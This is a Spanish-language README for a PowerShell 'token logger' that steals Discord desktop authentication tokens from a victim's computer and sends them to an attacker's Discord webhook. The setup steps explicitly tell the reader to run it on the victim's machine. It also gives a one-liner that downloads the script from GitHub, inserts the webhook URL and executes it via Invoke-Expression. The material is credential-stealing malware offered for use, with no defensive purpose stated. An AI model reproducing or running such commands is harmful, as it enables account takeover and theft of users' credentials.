# TokenLoggerScript

Script de PowerShell diseñado para extraer tokens de la aplicación de escritorio de Discord y enviarlos a través de un Webhook de Discord.

## Descripción

Este token logger se ejecuta mediante un script de PowerShell en la máquina de la víctima. Solo funciona si la víctima tiene la aplicación de Discord instalada en su computadora; si solo utiliza la versión web, no funcionará.

## Configuración y Uso

1. Abre el archivo `script.ps1`.
2. Reemplaza `URL_WEBHOOK` con el enlace del webhook donde deseas recibir el token.
3. Ejecutar en la maquina de la victima.

### Método de ejecución rápida (One-Liner)
También puedes ejecutar el script directamente desde PowerShell reemplazando tu URL de webhook en el siguiente comando:

```powershell
$webhook = "URL_WEBHOOK"; $script = (Invoke-WebRequest -Uri "[https://github.com/er1xkkk/TokenLoggerScript/raw/refs/heads/main/script.ps1](https://github.com/er1xkkk/TokenLoggerScript/raw/refs/heads/main/script.ps1)" -UseBasicParsing).Content; $script = $script -replace '[$]WebhookUrl\s*=\s*".*?"', "`$WebhookUrl = `"$webhook`""; Invoke-Expression $script; exit
